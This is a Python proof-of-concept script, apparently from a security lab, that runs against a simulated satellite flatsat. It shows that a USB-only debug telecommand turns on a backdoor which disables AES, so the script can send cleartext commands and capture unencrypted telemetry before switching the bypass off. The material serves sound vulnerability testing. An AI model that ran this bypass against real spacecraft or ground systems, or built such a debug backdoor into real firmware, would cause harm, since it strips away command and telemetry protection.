#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs

def main(dev, ev):
    # V0-12: DEBUG_CONFIG (APID 0x10, USB-only command) flips a global
    # bypass: ALL telemetry leaves in clear text and the USB bus skips the
    # AES path entirely. One physical USB-C touch = total crypto off.
    st = dev.find(dev.tc(0x10, b"\x01", via="usb"), 0x10)[0]   # auto-wrapped while secure on
    ev.log(f"debug status TM: usb_debug={st.u8(1)} secure_flag={st.u8(2)}")
    check(dev.sim.usb_debug, "debug bypass must be active")

    # telemetry is now cleartext (wire inspection: no AES wrapping)
    raw_frames = dev._advance(0)
    tms = dev.tc(0x0C, b"", via="radio", encrypt=False)   # radio TC must STILL be encrypted
    check(dev.err_text(tms) == "AES DECRYPT FAIL",
          "radio path keeps requiring crypto -- the bypass is the USB backdoor")
    tms = dev.tc(0x0C, b"", via="usb", encrypt=False)
    check(dev.find(tms, 0x0C), "USB cleartext TC accepted while bypassed")
    check(not tms[0].wrapped, "TM now leaks in clear text on every transport")
    ev.log(f"clear TM on radio downlink: {tms[0].payload[:12].hex()}")

    dev.tc(0x10, b"\x00", via="usb")
    ev.log(f"bypass off again: usb_debug={dev.sim.usb_debug}")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-12 USB debug backdoor bypasses all crypto", main))
